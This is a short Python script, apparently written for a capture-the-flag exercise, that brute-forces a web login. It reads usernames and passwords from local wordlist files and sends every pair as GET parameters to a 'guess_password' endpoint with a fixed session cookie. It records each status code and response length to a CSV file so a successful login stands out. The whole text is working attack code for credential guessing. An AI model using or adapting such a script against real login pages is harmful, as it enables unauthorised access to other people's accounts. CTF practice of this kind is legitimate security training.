url = "http://hkbuctf.xyz:3780/guess_password/s"
#proxies= {"http":"http://127.0.0.1:8080"}  #代理设置，方便burp抓包查看
header = {
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'
}

f = open('result.csv','w')
f.write('状态码' + ',' + '用户名' + ',' + '密码' + ',' + '包长度' + '\n')
for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):
	for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):
		username = admin.strip()
		password = line.strip()
		payload = {'username':username,'password':password,"Login":'Login'}
		Response = requests.get(url,params=payload,headers=header)
		result = str(Response.status_code) + ',' + username + ','\
            + password + ',' + str(len(Response.content))
		f.write(result + '\n')
		
		print('\n完成')
